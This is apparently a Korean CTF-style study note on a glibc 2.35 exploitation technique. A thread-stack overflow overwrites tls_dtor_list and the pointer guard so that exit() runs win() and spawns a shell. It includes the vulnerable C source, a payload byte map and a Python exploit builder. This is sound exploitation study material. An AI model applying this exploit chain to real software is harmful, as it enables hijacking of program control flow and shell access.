# tls_dtor_list overwrite (`__call_tls_dtors`)

- **환경**: Ubuntu 22.04 / glibc 2.35, Full RELRO · PIE · NX · Canary
- **기법**: 스레드 스택 BOF로 **TLS의 `tls_dtor_list`와 pointer guard**를 덮어, `exit()`가
  부르는 `__call_tls_dtors()`에서 `win()`을 호출시킴.

## 왜 이 기법인가
- Full RELRO → GOT overwrite 불가. glibc 2.34+ → `__free_hook`/`__malloc_hook` 제거.
- 스레드 함수가 `ret`이 아니라 `exit()`로 끝남 → **카나리 검사를 안 거침**(epilogue 생략).
- 프로그램이 `fs_base`, `buf`, `win` 주소를 직접 출력 → **leak 불필요**.

## 취약점 (main.c)
```c
void thread_routine() {
    char buf[256];                       // rbp-0x110
    ...
    syscall(SYS_arch_prctl, ARCH_GET_FS, &fs_base);
    printf("fs_base: %p\n", fs_base);    // TLS/TCB 기준주소 알려줌
    printf("buf_addr: %p\n", buf);       // 덮기 시작점
    printf("win: %p\n", win);            // 목표 함수
    scanf("%d", &size);                  // 길이 공격자 지정
    read(STDIN_FILENO, buf, size);       // 무제한 오버플로우
    exit(EXIT_SUCCESS);                  // ret 아님 → 카나리 검사 skip
}
```

## 트리거 경로
```
exit() → __run_exit_handlers(..., run_dtors=true) → __call_tls_dtors()
```
```c
// struct dtor_list { func(0x00); obj(0x08); map(0x10); next(0x18); }
void __call_tls_dtors(void) {
  while (tls_dtor_list) {                 // TLS 변수 = fs_base-0x58
    struct dtor_list *cur = tls_dtor_list;
    dtor_func func = cur->func;           // cur+0x00
    PTR_DEMANGLE(func);                   // ror(func,17) ^ *(fs_base+0x30)
    tls_dtor_list = cur->next;            // cur+0x18
    func(cur->obj);                       // ← 흐름 탈취 지점
  }
}
```

## 핵심 아이디어: func=0 + guard=win
PTR_MANGLE/DEMANGLE (x86-64):
```
MANGLE(p)   = ROL(p ^ guard, 17)      저장 시
DEMANGLE(p) = ROR(p, 17) ^ guard      호출 전
guard = *(fs_base + 0x30)             (pointer guard, TCB)
```
저장된 `func = 0`이면 `DEMANGLE(0) = ROR(0,17) ^ guard = guard`.
→ **guard 자리에 win을 써 두면 복호 결과가 그대로 win** (guard를 몰라도 됨).

그래서 세 가지만:
1. `tls_dtor_list`(`fs_base-0x58`) → 가짜 엔트리(buf 시작)를 가리키게
2. 가짜 엔트리의 `func` = 0
3. pointer guard(`fs_base+0x30`) = win

## payload 바이트 지도 (T=buf, F=fs_base)
| 조각 | 위치 | 의미 |
|---|---|---|
| `\x00*(F-T-0x58)` | T ~ F-0x58 | buf를 0으로 채움 → **T에 `func=obj=map=next=0` 가짜 dtor_list** 생성 |
| `p64(T)` | **F-0x58 = tls_dtor_list** | 리스트 머리를 T로 (≠0이라 루프 진입) |
| `A*0x50` | F-0x50 ~ F | TLS 변수~TCB 사이 패딩 |
| `B*0x10` | F ~ F+0x10 | TCB tcb/dtv 패딩 (exit 경로 미사용) |
| `p64(T)` | **F+0x10 = self** | 뭉갠 TCB self 포인터 복구(부수 크래시 방지) |
| `C*0x18` | F+0x18 ~ F+0x30 | gscope/sysinfo/**canary** 패딩 (exit라 canary 무관) |
| `p64(win)` | **F+0x30 = pointer guard** | func=0과 XOR → win 그대로 호출 |

실행:
```
tls_dtor_list=T(≠0) → cur=T → func=*(T)=0 → DEMANGLE=0^win=win
tls_dtor_list=*(T+0x18)=0 (다음 루프 종료) → win(0) = system("/bin/sh")
```

## 오프셋 크기 이유
- 목표(`F-0x58`, `F+0x30`)는 **스레드 스택보다 위의 TLS/TCB**에 있음(glibc는 TCB를 스레드
  스택 최상단에 둠). buf→TCB 거리 `F-T`가 통째로 빈 간격.
- pointer guard(F+0x30)에 8바이트 쓰려면 buf부터 **F+0x38까지** = `len=(F+0x38)-T` 바이트
  오버플로우 필요. `read`의 size를 공격자가 줘서 256을 넘겨 여기까지 밀어붙임.
- `0x58`은 glibc 2.35 기준 `fs_base - &tls_dtor_list`. gdb `p (long)&tls_dtor_list-$fs_base`로 확인.
  **버전 바뀌면 이 값도 바뀜.**

## 익스 (poc.py 요지)
```python
fs_base           = ...   # 프로그램이 출력
thread_stack_addr = ...   # buf 주소
win_addr          = ...

payload  = b'\x00'*(fs_base - thread_stack_addr - 0x58)
payload += p64(thread_stack_addr)   # tls_dtor_list → 가짜 엔트리
payload += b'A'*0x50
payload += b'B'*0x10
payload += p64(thread_stack_addr)   # TCB self 복구
payload += b'C'*0x18
payload += p64(win_addr)            # pointer guard = win
# size = len(payload) 를 먼저 보내고, 그다음 payload 전송
```

## 관련
- Full RELRO/hook 제거 대응 타깃: [[__exit_funcs_overwrite]], `_rtld_global`, `_IO_FILE`(FSOP).
- 카나리가 TLS에 있고 스레드 공유인 점은 master_canary와 연결됨.
